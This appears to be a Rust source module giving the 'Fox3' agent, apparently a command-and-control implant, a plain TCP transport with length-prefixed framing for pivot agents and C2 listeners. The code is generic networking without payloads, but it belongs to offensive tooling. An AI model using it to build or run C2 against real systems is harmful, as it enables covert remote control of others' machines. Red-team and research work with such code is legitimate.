/// Raw TCP transport for Fox3 simple_agent.
///
/// Used by pivot/child agents connecting through a parent agent's TCP relay
/// or directly to a C2 TCP listener.
///
/// # Protocol framing
/// Every message is framed with a 4-byte little-endian length prefix:
///   [4-byte LE length][message bytes]
///
/// # TLS
/// Currently plain TCP.  The JWE layer handles message confidentiality.
/// TLS wrapping can be added later with rustls.

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;
use crate::transport::Transporter;

pub struct TcpTransport {
    addr: String,
}

impl TcpTransport {
    pub fn new(addr: String) -> anyhow::Result<Self> {
        Ok(Self { addr })
    }
}

impl Transporter for TcpTransport {
    fn send(&self, _auth: &str, body: Vec<u8>) -> anyhow::Result<Vec<u8>> {
        // Open a new connection per message (stateless, like HTTP).
        let mut stream = TcpStream::connect_timeout(
            &self.addr.parse().map_err(|_| anyhow::anyhow!("tcp: invalid addr '{}'", self.addr))?,
            Duration::from_secs(10),
        )?;
        stream.set_read_timeout(Some(Duration::from_secs(30)))?;

        // Send: [4-byte LE length][body]
        let len = (body.len() as u32).to_le_bytes();
        stream.write_all(&len)?;
        stream.write_all(&body)?;

        // Receive: [4-byte LE length][response]
        let mut len_buf = [0u8; 4];
        stream.read_exact(&mut len_buf)?;
        let resp_len = u32::from_le_bytes(len_buf) as usize;
        let mut resp = vec![0u8; resp_len];
        stream.read_exact(&mut resp)?;

        Ok(resp)
    }

    fn kind(&self) -> &'static str { "tcp" }
}
